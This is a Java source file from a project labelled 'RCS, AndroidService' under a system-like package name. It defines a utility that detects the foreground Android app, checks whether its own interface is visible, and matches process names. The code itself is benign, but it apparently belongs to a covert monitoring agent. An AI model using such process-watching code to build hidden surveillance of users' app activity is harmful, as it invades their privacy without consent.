/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : RunningProcesses.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;

import com.android.dvci.auto.Cfg;
import com.android.dvci.gui.ASG;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

import java.util.List;

public class RunningProcesses {
	private static final String TAG = "RunningProcess"; //$NON-NLS-1$
	private static RunningProcesses instance;

	private String foreground = "";
	private final ActivityManager activityManager;

	private RunningProcesses() {
		activityManager = (ActivityManager) Status.getAppContext().getSystemService(Context.ACTIVITY_SERVICE);
	}

	public static RunningProcesses self() {
		if (instance == null) {
			instance = new RunningProcesses();
		}
		return instance;
	}
	public synchronized String getForeground_L(){

		Check.requires(activityManager != null, "Null activityManager"); //$NON-NLS-1$
		List<ActivityManager.RunningAppProcessInfo> processInfo = activityManager.getRunningAppProcesses();
		for (ActivityManager.RunningAppProcessInfo r: processInfo ){
			//IMPORTANCE_FOREGROUND Constant for importance: this process is running the foreground UI.
			if( r.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND )  {
				foreground = r.processName;
				break;
			}
		}
		return foreground;
	}

	public synchronized String getForeground(){
		Check.requires(activityManager != null, "Null activityManager"); //$NON-NLS-1$
		// get the info from the currently running task
		List<ActivityManager.RunningTaskInfo> taskInfo = activityManager.getRunningTasks(1);
		if(taskInfo==null || taskInfo.isEmpty()){
			return "";
		}
		ComponentName componentInfo = taskInfo.get(0).topActivity;
		foreground = componentInfo.getPackageName();
		return foreground;
	}
	public synchronized String getForeground_wrapper() {

		Check.requires(activityManager != null, "Null activityManager"); //$NON-NLS-1$
		String olfFore = foreground;
		if (android.os.Build.VERSION.SDK_INT > 20){
			getForeground_L();
		}else{
			getForeground();
		}
		if (Cfg.DEBUG) {
			if (!foreground.equals(olfFore)) {
				Check.log(TAG + " (update) topActivity CURRENT Activity: " + foreground);
			}
		}
		return foreground;
	}

	public boolean isGuiVisible() {
		Check.requires(activityManager != null, "Null activityManager"); //$NON-NLS-1$

		String pack = Status.self().getAppContext().getPackageName();
		String foreground = getForeground_wrapper();

			if (foreground.equals(pack)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (isGuiVisible), found: " + pack);
				}
				return true;
			}
		return false;
	}

	public synchronized boolean isPresent(String process) {

		if (foreground == null || foreground.length() == 0) {
			return false;
		}

		if (process.length() == 0) {
			return false;
		}

		if (StringUtils.matchStar(process, foreground) == true) {
			return true;
		}

		return false;
	}

}
